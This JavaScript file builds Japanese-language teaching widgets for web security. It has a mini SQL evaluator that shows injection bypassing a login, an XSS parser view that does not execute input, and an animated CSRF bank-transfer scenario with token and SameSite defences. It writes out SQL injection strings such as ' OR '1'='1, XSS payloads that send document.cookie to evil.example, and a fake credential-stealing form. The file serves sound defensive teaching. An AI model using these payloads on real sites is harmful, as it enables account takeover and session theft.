"use strict";
/* Web security widgets: SQL injection (mini SQL evaluator), XSS (parser view, nothing is executed), CSRF. */
(function (ST) {
  const esc = ST.esc;

  /* ---------- SQL injection ---------- */
  const USERS = [
    { id: 1, name: "admin", pass: "Xk9!fQ2#vL", role: "管理者", email: "admin@shop.example" },
    { id: 2, name: "sato", pass: "sakura2024", role: "会員", email: "sato@mail.example" },
    { id: 3, name: "tanaka", pass: "neko-neko-7", role: "会員", email: "tanaka@mail.example" },
    { id: 4, name: "suzuki", pass: "m0chi!m0chi", role: "会員", email: "suzuki@mail.example" }
  ];
  // Tokenize the WHERE clause. Returns tokens with {t:type, v:value, s:start, e:end}.
  function lex(q, from) {
    const out = []; let i = from;
    while (i < q.length) {
      const c = q[i];
      if (/\s/.test(c)) { i++; continue; }
      if (q.startsWith("--", i)) { out.push({ t: "comment", v: q.slice(i), s: i, e: q.length }); break; }
      if (c === "'") { let j = i + 1; while (j < q.length && q[j] !== "'") j++; if (j >= q.length) throw { msg: "文字列が閉じられていません", at: i }; out.push({ t: "str", v: q.slice(i + 1, j), s: i, e: j + 1 }); i = j + 1; continue; }
      if (c === "=") { out.push({ t: "op", v: "=", s: i, e: i + 1 }); i++; continue; }
      if (c === ";") { out.push({ t: "semi", v: ";", s: i, e: i + 1 }); i++; continue; }
      if (c === "(" || c === ")") { out.push({ t: c, v: c, s: i, e: i + 1 }); i++; continue; }
      const m = /^[A-Za-z_][A-Za-z0-9_]*|^[0-9]+/.exec(q.slice(i));
      if (!m) throw { msg: `「${c}」を解釈できません`, at: i };
      const w = m[0], up = w.toUpperCase();
      out.push({ t: up === "AND" || up === "OR" ? up : /^[0-9]/.test(w) ? "num" : "id", v: w, s: i, e: i + w.length }); i += w.length;
    }
    return out;
  }
  function evaluate(toks, row) {
    let p = 0;
    const toks2 = toks.filter(t => t.t !== "comment");
    const semi = toks2.findIndex(t => t.t === "semi"); const list = semi >= 0 ? toks2.slice(0, semi) : toks2;
    const peek = () => list[p], next = () => list[p++];
    const operand = () => { const t = next(); if (!t) throw { msg: "式が途中で終わっています" };
      if (t.t === "(") { const v = orE(); if (!next() || list[p - 1].t !== ")") throw { msg: "かっこが閉じられていません" }; return { bool: v }; }
      if (t.t === "str") return { v: t.v }; if (t.t === "num") return { v: t.v };
      if (t.t === "id") { if (!(t.v in row)) throw { msg: `列「${t.v}」は存在しません` }; return { v: String(row[t.v]) }; }
      throw { msg: `「${t.v}」の位置が不正です` }; };
    const cmp = () => { const a = operand(); if (a.bool !== undefined) return a.bool; const o = next(); if (!o || o.t !== "op") throw { msg: "比較演算子（=）が必要です" }; const b = operand(); return String(a.v) === String(b.v); };
    const andE = () => { let v = cmp(); while (peek() && peek().t === "AND") { next(); const r = cmp(); v = v && r; } return v; };
    const orE = () => { let v = andE(); while (peek() && peek().t === "OR") { next(); const r = andE(); v = v || r; } return v; };
    const v = orE(); if (p < list.length) throw { msg: `余分な「${list[p].v}」があります` };
    return { v, semi: semi >= 0 };
  }
  ST.widget("sqli", {
    title: "SQLインジェクション：入力がSQL文に変わる瞬間",
    mount(el) {
      el.innerHTML = `<div class="btns">${ST.segHtml("mode", [["concat", "文字列連結（脆弱）"], ["bind", "プレースホルダ（安全）"]], "concat")}</div>
        <div class="card" style="padding:12px;display:grid;gap:8px">
          <div class="eyebrow">ログインフォーム（架空のショップ）</div>
          <label class="field">ユーザー名<input class="input" id="sq-n" value="sato" autocomplete="off" spellcheck="false" autocapitalize="off"></label>
          <label class="field">パスワード<input class="input" id="sq-p" value="sakura2024" autocomplete="off" spellcheck="false" autocapitalize="off"></label>
          <div class="btns"><span class="cap">攻撃例：</span><button class="btn small" type="button" data-ex="1">' OR '1'='1</button><button class="btn small" type="button" data-ex="2">admin' --</button><button class="btn small" type="button" data-ex="3">' OR name='admin' --</button></div>
        </div>
        <div><div class="eyebrow">サーバーが組み立てるSQL文</div><div class="hexbox" data-q style="white-space:pre-wrap"></div>
          <p class="cap" data-legend style="margin-top:4px"></p></div>
        <div data-res></div>`;
      let mode = "concat";
      const n = el.querySelector("#sq-n"), pw = el.querySelector("#sq-p");
      const upd = () => {
        const N = n.value, Pw = pw.value, qEl = el.querySelector("[data-q]"), res = el.querySelector("[data-res]");
        let rows = [], err = null, semi = false, injected = false;
        if (mode === "bind") {
          qEl.innerHTML = `SELECT * FROM users\nWHERE name = <span style="color:var(--info)">?</span> AND pass = <span style="color:var(--info)">?</span>\n<span style="color:var(--muted)">-- ?1 = ${esc(JSON.stringify(N))}\n-- ?2 = ${esc(JSON.stringify(Pw))}</span>`;
          el.querySelector("[data-legend]").textContent = "SQL文の形は先に確定し、入力は「値」として別に渡されます。入力に ' が含まれていても、ただの文字として比較されます。";
          rows = USERS.filter(u => u.name === N && u.pass === Pw);
        } else {
          const pre = "SELECT * FROM users\nWHERE name = '", mid = "' AND pass = '", post = "'";
          const q = pre + N + mid + Pw + post;
          const r1 = [pre.length, pre.length + N.length], r2 = [pre.length + N.length + mid.length, pre.length + N.length + mid.length + Pw.length];
          const inUser = (s, e) => (s < r1[1] && e > r1[0]) || (s < r2[1] && e > r2[0]);
          const whereAt = q.indexOf("WHERE") + 5;
          let toks = [];
          try { toks = lex(q, whereAt); } catch (e) { err = e; }
          // paint: user-originated chars that ended up outside a string literal are "code"
          const kind = new Array(q.length).fill("tpl");
          for (let i = 0; i < q.length; i++) if ((i >= r1[0] && i < r1[1]) || (i >= r2[0] && i < r2[1])) kind[i] = "code";
          toks.forEach(t => { if (t.t === "str") for (let i = t.s + 1; i < t.e - 1; i++) if (kind[i] === "code") kind[i] = "val"; if (t.t === "comment") for (let i = t.s; i < t.e; i++) kind[i] = kind[i] === "code" ? "code" : "dead"; });
          let html = "";
          for (let i = 0; i < q.length; i++) { const k = kind[i], ch = esc(q[i]); html += k === "code" ? `<span style="background:var(--attack-soft);color:var(--attack);font-weight:600">${ch}</span>` : k === "val" ? `<span style="color:var(--ok)">${ch}</span>` : k === "dead" ? `<span style="color:var(--muted);text-decoration:line-through">${ch}</span>` : ch; }
          qEl.innerHTML = html;
          injected = kind.includes("code");
          el.querySelector("[data-legend]").innerHTML = `<span style="color:var(--ok)">緑</span>＝値として扱われる入力　<span style="color:var(--attack);font-weight:600">赤</span>＝<b>SQLの命令として解釈されてしまった入力</b>　<span style="text-decoration:line-through">取り消し線</span>＝コメントとして無視される部分`;
          if (!err) { try { USERS.forEach(u => { const r = evaluate(toks, u); semi = r.semi; if (r.v) rows.push(u); }); } catch (e) { err = e; } }
        }
        if (err) { res.innerHTML = `<div class="verdict mid">SQL構文エラー：${esc(err.msg)}<p>エラーの内容をそのまま画面に表示するサイトでは、このメッセージ自体が攻撃者のヒントになります。エラーの詳細は利用者に見せないのが原則です。</p></div>`; return; }
        res.innerHTML = `<div class="eyebrow">データベースが返した行（${rows.length}件）</div>
          <div class="scroll-x"><table class="tbl"><thead><tr><th>id</th><th>name</th><th>role</th><th>email</th></tr></thead><tbody>${USERS.map(u => { const hit = rows.includes(u); return `<tr style="${hit ? (injected ? "background:var(--attack-soft)" : "background:var(--ok-soft)") : "opacity:.45"}"><td class="num">${u.id}</td><td>${esc(u.name)}</td><td>${esc(u.role)}</td><td>${esc(u.email)}</td></tr>`; }).join("")}</tbody></table></div>
          ${rows.length === 0 ? `<div class="verdict good">ログイン失敗（一致する利用者なし）</div>` : injected ? `<div class="verdict bad">攻撃成功：「${esc(rows[0].name)}」（${esc(rows[0].role)}）としてログインされた<p>パスワードを知らないのに、条件が常に真になったり、パスワードの確認部分がコメントで無視されたりして、認証を回避されました。${rows.length > 1 ? "一覧表示の画面なら、全員分の情報が漏えいします。" : ""}</p></div>` : `<div class="verdict good">正しい利用者としてログイン（${esc(rows[0].name)}）</div>`}
          <p class="cap">※ 学習用に、パスワードを平文で比較する単純な例にしています。実際のシステムではハッシュ化して保存します。</p>`;
        if (injected && rows.length) ST.markLab("sqli");
      };
      const EX = { 1: ["' OR '1'='1", "' OR '1'='1"], 2: ["admin' --", "なんでも"], 3: ["' OR name='admin' --", "x"] };
      ST.$$("[data-ex]", el).forEach(b => b.onclick = () => { [n.value, pw.value] = EX[b.dataset.ex]; upd(); });
      n.oninput = pw.oninput = upd;
      ST.wireSeg(el, "mode", v => { mode = v; upd(); });
      upd();
    }
  });

  /* ---------- XSS ---------- */
  ST.widget("xss", {
    title: "XSS：入力がHTMLとして解釈される",
    mount(el) {
      el.innerHTML = `<p class="cap">掲示板のコメント欄に入力された文字が、他の人のブラウザでどう解釈されるかを見ます。このツールの中では、入力したスクリプトは<b>実行されません</b>（解析して表示するだけです）。</p>
        <div class="btns">${ST.segHtml("mode", [["raw", "そのまま出力（脆弱）"], ["esc", "エスケープして出力"]], "raw")}</div>
        <label class="field">コメント<textarea class="input" id="xs-in" rows="2" spellcheck="false" autocapitalize="off">&lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;</textarea></label>
        <div class="btns"><span class="cap">例：</span><button class="btn small" type="button" data-ex="0">普通のコメント</button><button class="btn small" type="button" data-ex="1">&lt;script&gt;</button><button class="btn small" type="button" data-ex="2">onerror</button><button class="btn small" type="button" data-ex="3">偽フォーム</button></div>
        <div><div class="eyebrow">サーバーが返すHTML</div><div class="hexbox" data-html style="white-space:pre-wrap"></div></div>
        <div data-out></div>`;
      const EX = ["新商品よかったです！また買います。", "<script>new Image().src='https://evil.example/?c='+document.cookie</script>", "<img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\">", "<div style=\"position:fixed;inset:0;background:#fff\"><h2>再ログインしてください</h2><form action=\"https://evil.example/steal\"><input name=pw type=password><button>ログイン</button></form></div>"];
      const inp = el.querySelector("#xs-in"); let mode = "raw";
      const upd = () => {
        const v = inp.value, ins = mode === "raw" ? v : esc(v);
        el.querySelector("[data-html]").innerHTML = esc('<div class="comment">') + `<span style="color:${mode === "raw" ? "var(--attack)" : "var(--ok)"}">${esc(ins)}</span>` + esc("</div>");
        const doc = new DOMParser().parseFromString(`<div id="r">${ins}</div>`, "text/html"); // parsing does not execute scripts
        const root = doc.getElementById("r"), found = [];
        root.querySelectorAll("*").forEach(n => {
          const tag = n.tagName.toLowerCase();
          if (tag === "script") found.push(["script", "<script>要素：中身のJavaScriptが実行される"]);
          [...n.attributes].forEach(a => { if (/^on/i.test(a.name)) found.push(["event", `<${tag} ${a.name}>：イベント発生時に JavaScript が実行される`]); if (/^\s*javascript:/i.test(a.value)) found.push(["js", `${a.name}="javascript:…"：クリック等で実行される`]); });
          if (tag === "form" && /^https?:/i.test(n.getAttribute("action") || "")) found.push(["form", `<form action="${n.getAttribute("action")}">：入力内容が外部に送られる偽フォーム`]);
          if (tag === "iframe") found.push(["iframe", "<iframe>：別のページを埋め込む"]);
        });
        const steals = /document\.cookie/.test(v) && found.some(f => f[0] !== "form");
        const els = [...root.querySelectorAll("*")].map(n => n.tagName.toLowerCase());
        el.querySelector("[data-out]").innerHTML = `<div class="eyebrow">ブラウザの解釈</div>
          <div class="card" style="padding:12px"><dl class="kv"><dt>作られる要素</dt><dd>${els.length ? els.map(t => `&lt;${t}&gt;`).join(" ") : "なし（文字として表示）"}</dd><dt>表示される文字</dt><dd>${esc(root.textContent) || "—"}</dd></dl></div>
          ${found.length ? `<div class="verdict bad">このコメントを見た人のブラウザで危険な動作が起きる<p>${found.map(f => "・" + esc(f[1])).join("<br>")}${steals ? "<br>・Cookie（ログイン状態）が攻撃者のサーバー evil.example に送られ、なりすましに使われる" : ""}</p></div>`
          : `<div class="verdict good">${mode === "esc" && /[<>]/.test(v) ? "< や > が &amp;lt; &amp;gt; に置き換えられ、ただの文字として表示される" : "危険な要素はありません"}</div>`}`;
        if (found.length) ST.markLab("xss");
      };
      inp.oninput = upd;
      ST.$$("[data-ex]", el).forEach(b => b.onclick = () => { inp.value = EX[+b.dataset.ex]; upd(); });
      ST.wireSeg(el, "mode", v => { mode = v; upd(); });
      upd();
    }
  });

  /* ---------- CSRF ---------- */
  ST.widget("csrf", {
    title: "CSRF：罠サイトから勝手に送金させる",
    mount(el) {
      el.innerHTML = `<div class="def"><label class="toggle"><input type="checkbox" id="cs-tok"><span>CSRFトークンを確認する<br><span class="d">フォームに推測できない値を埋め込み、送られてきた値と照合</span></span></label>
        <label class="toggle"><input type="checkbox" id="cs-ss"><span>Cookieに SameSite=Lax を付ける<br><span class="d">別サイトから送られるPOSTにはCookieを付けない</span></span></label></div><div data-seq></div>`;
      let player;
      const run = () => {
        const tok = el.querySelector("#cs-tok").checked, ss = el.querySelector("#cs-ss").checked;
        const steps = [
          { f: "b", t: "bank", label: "ログイン", note: "あなたは銀行サイトにログインします。" },
          { f: "bank", t: "b", label: "Set-Cookie: session=…", dash: 1, kind: "info", note: `銀行サイトはセッションIDをCookieとして渡します${ss ? "（SameSite=Lax 付き）" : ""}。以後ブラウザは、銀行サイトへのリクエストにこのCookieを自動で付けます。` },
          { f: "b", t: "trap", label: "罠ページを開く", note: "ログインしたまま、SNSで見かけたリンクから別のサイト（罠サイト）を開きます。" },
          { f: "trap", t: "b", label: "隠しフォーム＋自動送信", dash: 1, kind: "attack", note: "罠ページには、銀行の送金URLに向けた見えないフォームと、それを自動で送信するスクリプトが仕込まれています。" },
          { f: "b", t: "bank", label: ss ? "POST /transfer（Cookieなし）" : "POST /transfer + Cookie", kind: "attack", note: ss ? "ブラウザは送金リクエストを送りますが、**別のサイトから始まったPOST**なので、SameSite=Lax のCookieを付けません。" : "ブラウザは送金リクエストを送り、銀行サイトのCookieを**自動で付けて**しまいます。銀行サイトから見ると、ログイン中の本人の操作と区別がつきません。" },
          ss ? { f: "bank", t: "bank", label: "未ログイン扱い", kind: "ok", note: "Cookieがないため、銀行サイトはログインしていないリクエストとして拒否します。" }
            : tok ? { f: "bank", t: "bank", label: "トークン不一致→拒否", kind: "ok", note: "罠サイトは、銀行のフォームに埋め込まれた**推測できないトークン**を知ることができません（同一オリジンポリシーで読めない）。トークンがないリクエストは拒否されます。" }
              : { f: "bank", t: "bank", label: "送金を実行", kind: "attack", note: "銀行サイトは正規の操作だと思って送金を実行してしまいます。" }
        ];
        player && player.stop();
        const safe = tok || ss;
        player = ST.seq(el.querySelector("[data-seq]"), { actors: [{ id: "b", label: "ブラウザ" }, { id: "trap", label: "罠サイト", atk: true }, { id: "bank", label: "銀行サイト" }], steps,
          outro: safe ? "攻撃を阻止：本人の意図しない送金は実行されない" : "攻撃成功：ページを開いただけで送金された", outroKind: safe ? "good" : "bad", onDone: () => ST.markLab("csrf") });
      };
      el.querySelector("#cs-tok").onchange = run; el.querySelector("#cs-ss").onchange = run;
      run();
      return () => player && player.stop();
    }
  });
})(window.ST);
